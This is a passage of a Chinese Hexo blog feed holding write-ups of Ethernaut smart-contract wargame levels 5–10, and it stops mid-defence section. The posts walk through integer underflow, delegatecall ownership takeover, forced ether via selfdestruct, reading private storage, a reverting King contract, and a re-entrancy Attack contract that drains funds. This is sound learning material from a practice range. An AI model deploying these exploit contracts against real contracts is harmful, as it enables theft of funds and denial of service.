+    <content type="html"><![CDATA[<h1 id="跨链与侧链"><a href="#跨链与侧链" class="headerlink" title="跨链与侧链"></a>跨链与侧链</h1><h2 id="跨链"><a href="#跨链" class="headerlink" title="跨链"></a>跨链</h2><p>简单的说跨链就是解决如何把一个条链上的Token转移到另外一条链上。本质上是一套链与链之间的清算机制，清算的本质就是精准记账。</p><p>为什么要跨链?</p><p>1、不同链上的资产交换</p><p>2、多个场景打通的token互兑</p><p>3、跨越多个区块链网络达成的智能合约</p><p>4、一条链上资产被抵押或者锁定，能否用于抵押另一条链上的商品与服务，这需要实现链之间的通信与确认</p><p>如何实现跨链</p><p>1、分布式私钥控制</p><p>2、用侧链&amp;中继链</p><p>3、公证人模式</p><p>4、哈希锁定模式</p>]]></content>
+    
+    
+    <summary type="html">学习</summary>
+    
+    
+    
+    <category term="区块链" scheme="https://kdlwtrdrgm.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    
+    <category term="区块链" scheme="https://kdlwtrdrgm.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Token第5关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/5.Ethernaut-Token/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/5.Ethernaut-Token/</id>
+    <published>2021-07-23T07:27:00.000Z</published>
+    <updated>2021-08-02T08:27:30.406Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Token第5关练习"><a href="#Token第5关练习" class="headerlink" title="Token第5关练习"></a>Token第5关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li>首先会给你20个token，想办法去获得更多的Token!</li></ol><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token {  mapping(address =&gt; uint) balances;  uint public totalSupply;  constructor(uint _initialSupply) public {    balances[msg.sender] = totalSupply = _initialSupply;  }//构造函数,在一开始给合约一些钱  function transfer(address _to, uint _value) public returns (bool) {    require(balances[msg.sender] - _value &gt;= 0);//先检查调用者的余额是不是大于转账金额    balances[msg.sender] -= _value;//调用的人减金额_value    balances[_to] += _value;//给目标增加金额_value    return true;  }//转账  function balanceOf(address _owner) public view returns (uint balance) {    return balances[_owner];  }//查询余额}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>可以看到两个函数，一个是transfer，一个是balanceOf,构造函数定义了totalSupply。可控点是address,value。在transfer函数中有一处”require“校验，此处可以通过”整数下溢“来绕过检查，同时这里的balances和value都是无符号整数，以加减法为例，在 Solidity 中 <code>(2**256 - 1) + 1 = 0</code> ， <code>0 - 1 = 2**256 - 1</code> 。目标合约中如果我们传入的 value 大于 20，则 <code>balances[msg.sender] - _value</code> 会溢出变成极大数，如此可以顺利通过 require 检验，并使得发送者获得天量代币。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723151124207.png"></p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、点击“Get new Instance”来获取一个实例。</p><p>2、查看初始化玩家的token数量，玩家地址</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723152041659.png"></p><p>3、输入<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723153050824.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210723153105977.png"></p><p>这时候发生了一个情况rinkeby网络出现拥堵，存在一些问题无法使用，于是我们转到remix上进行</p><p>将代码复制到remix中点击</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210726165519951.png"></p><p>initialSupply输入20点击Deploy<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210726165722606.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210726171531545.png"></p><p>查看到存在的Token为20，输入transfer中参数，输入其他任意地址和21，即可产生整数溢出，点击transfer,查看balanceOf</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210726171636444.png"></p><p>在网的话就顺利提交即可</p><p>好的亲爱的朋友们，可能是我的metamask钱包卡住了，我们尝试重设一下钱包，继续试试吧</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727101254076.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727101454766.png"></p><p>get new instance后查看余额，输入contract.transfer(“0x8E27dCd7218F2C673A01Aa432707eBA771E6cb9E”,21)<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727101948428.png"></p><p>直接输入可能会报错，可能是存在编译上的问题，我们加上引号就行。</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727101829645.png"></p><p>确认以后查看balanceOf，<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727102041869.png">开启代币土豪生涯</p>]]></content>
+    
+    
+    <summary type="html">第5关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Delegation第6关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/6.Ethernaut-Delegation/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/6.Ethernaut-Delegation/</id>
+    <published>2021-07-23T03:19:00.000Z</published>
+    <updated>2021-08-02T08:27:30.406Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Delegation第6关练习"><a href="#Delegation第6关练习" class="headerlink" title="Delegation第6关练习"></a>Delegation第6关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ol><li><p>此级别的目标是让您声明对所给实例的所有权。</p><p> 可能有帮助的事情</p><ul><li>查看 Solidity 关于低级函数的文档，它是如何工作的，它如何用于将操作委托给链上库，以及它对执行范围有什么影响。<code>delegatecall</code></li><li>回退方法</li><li>方法 ID</li></ul></li></ol><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Delegate {  address public owner;  constructor(address _owner) public {    owner = _owner;  }//构造函数  function pwn() public {    owner = msg.sender;  }//如果能调用这个pwn函数就可以了}contract Delegation {  address public owner;  Delegate delegate;  constructor(address _delegateAddress) public {    delegate = Delegate(_delegateAddress);//把合约给实例化了    owner = msg.sender;  }  fallback() external {    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);    if (result) {      this;    }//fallback函数,其中的delegatecall跟call的区别在于    //前者所调用的函数在本合约中执行的,其他的信息都是自己合约的,相当于把函数拷贝到当前合约来执行  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p><a href="https://paper.seebug.org/633/#0x00">三种调用函数</a></p><p>在 Solidity 中，<code>call</code> 函数簇可以实现跨合约的函数调用功能，其中包括 <code>call</code>、<code>delegatecall</code> 和 <code>callcode</code> 三种方式</p><p>以下是 Solidity 中 <code>call</code> 函数簇的调用模型：</p><pre><code>&lt;address&gt;.call(...) returns (bool)&lt;address&gt;.callcode(...) returns (bool)&lt;address&gt;.delegatecall(...) returns (bool)</code></pre><p>这些函数提供了灵活的方式与合约进行交互，并且可以接受任何长度、任何类型的参数，其传入的参数会被填充至 32 字节最后拼接为一个字符串序列，由 EVM 解析执行。</p><p>在函数调用的过程中， Solidity 中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。</p><h4 id="三种调用方式的异同点"><a href="#三种调用方式的异同点" class="headerlink" title="三种调用方式的异同点"></a><strong>三种调用方式的异同点</strong></h4><ul><li><p>call: 最常用的调用方式，调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，执行环境为<strong>被调用者</strong>的运行环境(合约的 storage)。</p></li><li><p>delegatecall: 调用后内置变量 <code>msg</code> 的值<strong>不会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</p></li><li><p>callcode: 调用后内置变量 <code>msg</code> 的值<strong>会修改</strong>为调用者，但执行环境为<strong>调用者</strong>的运行环境。</p></li></ul><p>在这里我们看到了两个合约，Delegate初始化时将传入的address设定为合约的owner，下面一个pwn函数也引起我们的注意，从名字也能看出挺关键的。<br>之后下面的Delegation合约则实例化了上面的Delegate合约，其fallback函数使用了delegatecall来调用其中的delegate合约，而这里的delegatecall就是问题的关键所在。<br>我们经常会使用call函数与合约进行交互，对合约发送数据，当然，call是一个较底层的接口，我们经常会把它封装在其他函数里使用，不过性质是差不多的，这里用到的delegatecall跟call主要的不同在于通过delegatecall调用的目标地址的代码要在当前合约的环境中执行，也就是说它的函数执行在被调用合约部分其实只用到了它的代码，所以这个函数主要是方便我们使用存在其他地方的函数，也是模块化代码的一种方法，然而这也很容易遭到破坏。当前上下文中进行执行，但是在 msg.sender 和 msg.value 的指向上却有差异。</p><p>在这里我们要做的就是使用delegatecall调用delegate合约的pwn函数，这里就涉及到使用call指定调用函数的操作，当你给call传入的第一个参数是四个字节时，那么合约就会默认这四个自己就是你要调用的函数，它会把这四个字节当作函数的id来寻找调用函数，而一个函数的id在以太坊的函数选择器的生成规则里就是其函数签名的sha3的前4个bytes，函数前面就是带有括号括起来的参数类型列表的函数名称。</p><p>经过上面的简要分析，问题就变很简单了，sha3我们可以直接通过web3.sha3来调用，而delegatecall在fallback函数里，我们得想办法来触发它，前面已经提到有两种方法来触发，但是这里我们需要让delegatecall使用我们发送的data，所以这里我们直接用封装好的sendTransaction来发送data，其实到了这里我也知道了前面fallback那关我们也可以使用这个方式来触发fallback函数：<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727105611168.png"></p><p>观察题目我们可以发现 Delegation 的 fallback 函数会使用 delegatecall 调用 Delegate 合约，而 Delegate 合约中的 pwn() 函数就是用来修改 owner 的。因此我们只需要向 Delegation 合约发送一笔 msg.data 为 pwn() 函数签名的交易即可：</p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、get net instance，查看玩家地址，合约地址，合约所有者</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727110645894.png"></p><p>2、<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727111424086.png">输入代码发现编译上存在问题修改一下为<code>web.utils.sha3("pwn()");</code></p><p>3、现在再查看owner</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727111833813.png">拿到，提交成功</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727111917175.png"></p><p>这里给大家几个建议：</p><ol><li><code>call</code>、<code>callcode</code>、<code>delegatecall</code>调用的自由度极大，并且 <code>call</code> 会发生 <code>msg</code> 值的改变，需要谨慎的使用这些底层的函数；同时在使用时，需要对调用的合约地址、可调用的函数做严格的限制。</li><li><code>call</code> 与 <code>callcode</code> 调用会改变 <code>msg</code> 的值，会修改 <code>msg.sender</code> 为调用者合约的地址，所以在合约中不能轻易将合约本身的地址作为可信地址。</li><li><code>delegatecall</code> 与 <code>callcode</code> 会拷贝目标代码到自己的环境中执行，所以调用的函数应该做严格的限制，避开调用任意函数的隐患。</li><li>智能合约在部署前必须通过严格的审计和测试。</li></ol>]]></content>
+    
+    
+    <summary type="html">第6关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Force第7关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/7.Ethernaut-Force/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/7.Ethernaut-Force/</id>
+    <published>2021-07-22T17:49:00.000Z</published>
+    <updated>2021-08-02T08:27:30.407Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Force第7关练习"><a href="#Force第7关练习" class="headerlink" title="Force第7关练习"></a>Force第7关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ul><li>让合约的balance比0多</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">pragma solidity ^0.4.18;contract Force {/*                   MEOW ?         /\_/\   /    ____/ o o \  /~____  =ø= / (______)__m_m)*/}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>有趣有趣真有趣，一个猫咪的空合约？</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727114115881.png">经过查看资料，发现在以太坊里我们是可以强制给一个合约发送eth的，不管它要不要它都得收下，这是通过selfdestruct函数来实现的，如它的名字所显示的，这是一个自毁函数，当你调用它的时候，它会使该合约无效化并删除该地址的字节码，然后它会把合约里剩余的资金发送给参数所指定的地址，比较特殊的是这笔资金的发送将无视合约的fallback函数，因为我们之前也提到了当合约直接收到一笔不知如何处理的eth时会触发fallback函数，然而selfdestruct的发送将无视这一点，这里确实是比较有趣了。<br>那么接下来就非常简单了，我们只需要创建一个合约并存点eth进去然后调用selfdestruct将合约里的eth发送给我们的目标合约就行了。</p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、拿取目标信息</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727122637276.png"></p><p>2、在remix中插入攻击代码</p><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.4.20;contract Force { function Force() public payable {} function exploit(address _target) public {    selfdestruct(_target); }}</code></pre><p>这里需要注意版本，1wei，合约地址</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727123054045.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727123116173.png"></p><p>exploit后</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727123220012.png"></p><p>成功</p><p>4、提交胜利</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727123307277.png"></p>]]></content>
+    
+    
+    <summary type="html">第7关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Vault第8关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/8.Ethernaut-Vault/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/8.Ethernaut-Vault/</id>
+    <published>2021-07-21T10:22:00.000Z</published>
+    <updated>2021-08-02T08:27:30.407Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Vault第8关练习"><a href="#Vault第8关练习" class="headerlink" title="Vault第8关练习"></a>Vault第8关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ul><li>解锁金库以通过关卡！</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Vault {  bool public locked;  bytes32 private password;//定义了一个密码  constructor(bytes32 _password) public {    locked = true;//构造函数,locked为true    password = _password;//定义了一个password  }  function unlock(bytes32 _password) public {    if (password == _password) {      locked = false;//如果输入的密码正确就可以解锁    }  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p><a href="https://www.chainnode.com/post/226862">从合约外如何读取私有变量</a></p><p>要求是令 <code>locked = false</code> , 其实就是要我们猜测 <code>password</code> 的值， 这里有个细节不论是 <code>private</code> 变量还是 <code>public</code> 变量都是会存储在区块链上的，就是说依然是公开的。</p><p>这里通过getStorageAt函数来访问它，getStorageAt函数可以让我们访问合约里状态变量的值，它的两个参数里第一个是合约的地址，第二个则是变量位置position，它是按照变量声明的顺序从0开始，顺次加1，不过对于mapping这样的复杂类型，position的值就没那么简单了。至于web3.js有新的学习任务了，参考链接：<br><a href="https://www.qikegu.com/docs/5124">web3.js 教程</a></p><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、查看到他的合约地址<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727132831787.png">通过web3.eth.getStorageAt拿到他的password，位置是在[1]</p><p>2、先将他进行Ascii解码，注意这里web3可能会用到<code>web3.utils.hexToAscii</code>或者<code>web.utils.toAscii</code>，通过alert或者console.info 的将他输出出来</p><pre><code class="console">web3.eth.getStorageAt(contract.address, 1,function(x,y){alert(web3.utils.hexToAscii(y))})</code></pre><pre><code class="console">web3.eth.getStorageAt(contract.address, 1,function(x,y){console.info(web3.utils.toAscii(y))})</code></pre><p>3、最后，解锁，查看解锁状态<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727133659321.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727133733106.png"></p><p>4、且慢，还有另一种方式，</p><pre><code>let password = await web3.eth.getStorageAt(instance, 1)contract.unlock(password)</code></pre><p>赋值解锁效率更快</p><p>5、快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727133951943.png"></p>]]></content>
+    
+    
+    <summary type="html">第8关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>King第9关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/9.Ethernaut-King/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/9.Ethernaut-King/</id>
+    <published>2021-07-21T08:52:00.000Z</published>
+    <updated>2021-08-02T08:27:30.408Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="King第9关练习"><a href="#King第9关练习" class="headerlink" title="King第9关练习"></a>King第9关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><ul><li>给合约转钱，钱比上一个国王多就可以成为新的国王，过关条件是成为永久的国王。</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract King {  address payable king;  uint public prize;  address payable public owner;  constructor() public payable {    owner = msg.sender;      king = msg.sender;//构造函数,king是创建者    prize = msg.value;//prize是创建者发送的金额  }  fallback() external payable {    require(msg.value &gt;= prize || msg.sender == owner);//要求发送的金额大于等于king的金额或发送者是合约拥有着    king.transfer(msg.value);//把的转账给目前的king    king = msg.sender;//king变成msg.sender    prize = msg.value;//prize是现在这个king发送的金额数  }  function _king() public view returns (address payable) {    return king;  }}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>观察合约可以知道，当 King 合约接收到转账的时候，会校验转账金额，通过校验的话，则向当前 King 退款并设置新的 King。我们的任务就是阻止新的 King 的设置，那么使得 King 合约执行到 <code>king.transfer(msg.value)</code> 时 revert 即可。当原智能合约有新的king诞生时会向我们的合约退还之前的奖金，但是攻击合约不接收，直接revert()那么就可以永远占据合约的king不放：攻击合约如下，不设置 payable 的 fallback 函数或者在 fallback 函数中 revert 都可以。</p><pre><code class="solidity">pragma solidity ^0.4.18;contract attack{    function attack(address _addr) public payable{        _addr.call.gas(10000000).value(msg.value)();    }//先给合约一些钱,使得我们成为king    function () public {        revert();//在 fallback 函数中 revert    }}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，需要支付1ETH</p><p>2、<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727144321952.png">查看玩家地址，合约地址，国王地址，国王金额，prize值</p><p>3、部署攻击合约</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727151112203.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727151303673.png">查看攻击合约地址，再次查看king地址，就变成了我们攻击合约的地址了：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727151558934.png"></p><p>4、提交实例，检查结果</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727151926809.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727151947734.png"></p>]]></content>
+    
+    
+    <summary type="html">第9关</summary>
+    
+    
+    
+    <category term="Ethernaut" scheme="https://kdlwtrdrgm.github.io/categories/Ethernaut/"/>
+    
+    
+    <category term="靶场" scheme="https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Re-Entrancy第10关练习</title>
+    <link href="https://kdlwtrdrgm.github.io/Ethernaut/10.Ethernaut-Re-entrancy/"/>
+    <id>https://kdlwtrdrgm.github.io/Ethernaut/10.Ethernaut-Re-entrancy/</id>
+    <published>2021-07-21T06:45:00.000Z</published>
+    <updated>2021-08-02T08:27:30.396Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Re-entrancy第10关练习"><a href="#Re-entrancy第10关练习" class="headerlink" title="Re-entrancy第10关练习"></a>Re-entrancy第10关练习</h1><h2 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h2><p>此级别的目标是让您从合约中窃取所有资金。</p><p> 可能有帮助的事情：</p><ul><li>不受信任的合约可以在您最不期望的地方执行代码。</li><li>回退方法</li><li>抛出/恢复冒泡</li><li>有时，攻击合同的最佳方式是使用另一份合同。</li><li>“超越控制台”部分</li></ul><h2 id="合约代码："><a href="#合约代码：" class="headerlink" title="合约代码："></a>合约代码：</h2><pre><code class="solidity">// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import '@openzeppelin/contracts/math/SafeMath.sol';contract Reentrance {    using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable {    balances[_to] = balances[_to].add(msg.value);  }//捐赠  function balanceOf(address _who) public view returns (uint balance) {    return balances[_who];  }//查看余额  function withdraw(uint _amount) public {    if(balances[msg.sender] &gt;= _amount) {//提现金额要大于余额      (bool result, bytes memory data) = msg.sender.call.value(_amount)("");      if(result) {        _amount;      }//提现      balances[msg.sender] -= _amount;    }//但是这里是完成交易之后再从账户里面把提现的金额减去  }  fallback() external payable {}}</code></pre><h2 id="合约分析："><a href="#合约分析：" class="headerlink" title="合约分析："></a>合约分析：</h2><p>从上面的源代码可以确定这里应该为以太坊里的重入攻击，这也是之前The DAO事件里黑客所用到的攻击。<br>在这里我们重点来看withdraw函数，我们可以看到它接收了一个amount参数，将其与发送者的balance进行比较，不超过发送者的balance就将这些amount发送给sender，同时我们注意到这里它用来发送ether的函数是call.value,发送完成后，它才在下面更新了sender的balances，这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether，同样利用的是我们熟悉的fallback函数来实现。</p><p>当然，这里还有另外一个关键的地方——call.value函数特性，当我们使用call.value()来调用代码时，执行的代码会被赋予账户所有可用的gas,这样就能保证我们的fallback函数能被顺利执行，对应的，如果我们使用transfer和send函数来发送时，代码可用的gas仅有2300而已，这点gas可能仅仅只够捕获一个event，所以也将无法进行可重入攻击，因为send本来就是transfer的底层实现，所以他两性质也差不多。</p><p>因为他是提现完成之后才修改账户余额的，可以使用重入攻击</p><p>另外常用转币方式有三种，题目中用了第三种方法</p><address>.reansfer()发送失败时会通过 throw 回滚状态，只会传递 2300 个 gas 以供调用，从而防止重入<address>.send()发送失败时，返回布尔值 false，只会传递 2300 个 gas  以供调用，从而防止重入<address>.gas().call.value()()当发送失败时，返回布尔值 false 将传递所有可用的 gas 进行调用（可通过 gas(gas _value) 进行限制），不能有效防止重入攻击使用的EXP代码：<pre><code class="solidity">pragma solidity ^0.4.18;contract Reentrance {  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable {    balances[_to] += msg.value;  }//捐赠  function balanceOf(address _who) public view returns (uint balance) {    return balances[_who];  }//查看余额  function withdraw(uint _amount) public {    if(balances[msg.sender] &gt;= _amount) {      if(msg.sender.call.value(_amount)()) {        _amount;      }//提现      balances[msg.sender] -= _amount;    }  }  function() public payable {}}contract Attack {    address instance_address = 0xf9C751E4cc2fCE83242FEb07CD0Dc36cC4CCa01D;    Reentrance target = Reentrance(instance_address);    function Attack() public payable{}    function donate() public payable {        target.donate.value(msg.value)(this);    }//首先,需要捐赠一些钱,满足withdraw的要求    function hack() public {        target.withdraw(0.5 ether);    }//然后调用合约的withdraw函数提现    function get_balance() public view returns(uint) {        return target.balanceOf(this);    }    function my_eth_bal() public view returns(uint) {        return address(this).balance;    }    function ins_eth_bal() public view returns(uint) {        return instance_address.balance;    }    function () public payable {        target.withdraw(0.5 ether);    }//因为我们接受以太币的时候也会调用我们的回退函数     //而我们的回退函数中又一次调用了题目合约的withdraw函数}</code></pre><h2 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h2><p>1、获取实例，查看合约地址，合约余额</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727160357381.png"></p><p>2、在remix中部署合约，编译之后将合约部署到网络上，此时查看，可以看到</p><ul><li><p>balance 为 0</p></li><li><p>Reentrance 账户余额 1 ether</p></li><li><p>Attack 账户余额 0 ether</p></li></ul><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727173442310.png"></p><p>然后调用donate函数，我们需要在受攻击的合约里给我们的攻击合约地址增加一些balance以完成withdraw第一步的检查：首先在value处填写1 ether；以攻击者合约的身份向题目地址转账 1 ether；</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727173527749.png"></p><ul><li><p>balance 为 1 ether</p></li><li><p>Reentrance 账户余额 2 ether</p></li><li><p>Attack 账户余额 0 ether<img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727174011687.png"></p></li></ul><p>3、然后开始攻击，点击hack，成功以后观察：</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727174126567.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727174212788.png"></p><p>到这里题目算是完成了，提交就行，但是没太能够理解，那就来复盘几次吧</p><p>攻击的思路依然是在fallback函数上做文章：在账户被修改余额前不断递归调用此函数，造成了银行账户被取光的效果。为了巩固对这个漏洞的理解，我们回头去看第一关，Fallback。</p><hr><p>这里使用另一种方法进行donate，好吧，其实之前语法弄错，自己再来一次</p><p>通过控制台进行donate使用，语法参考web3.js，需要规范一下，不然会报错</p><pre><code class="solidity">contract.donate.sendTransaction('0xf9C751E4cc2fCE83242FEb07CD0Dc36cC4CCa01D',{value: web3.utils.toWei('1', 'ether')})</code></pre><p>之前直接使用这个toWei 报了格式的错误</p><pre><code>contract.donate.sendTransaction("0xeE59e9DC270A52477d414f0613dAfa678Def4b02",{value: toWei(1)})</code></pre><p><a href="http://cw.hubwiz.com/card/c/web3.js-1.0/1/8/24/">“web3.js的单位”</a></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727183305190.png"></p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727183439342.png">加到0.5eth再执行上面的hack,观察到余额变为0，快乐提交</p><p><img src="https://raw.githubusercontent.com/kdlwtrdrgm/kdlwtrdrgm.github.io/img/image-20210727183846963.png"></p><h2 id="防御措施："><a href="#防御措施：" class="headerlink" title="防御措施："></a>防御措施：</h2><p>1、在可能的情况下，将ether发送给外部地址时使用solidity内置的transfer()函数，transfer()转账时只发送2300gas，不足以调用另一份合约(即重入发送合约)，使用transfer()重写原合约的withdrawFunds()如下；</p><pre><code class="js">function withdraw(uint _amount) public {    if(balances[msg.sender] &gt;= _amount) {        msg.sender.transfer(_amount);        balances[msg.sender] -= _amount;    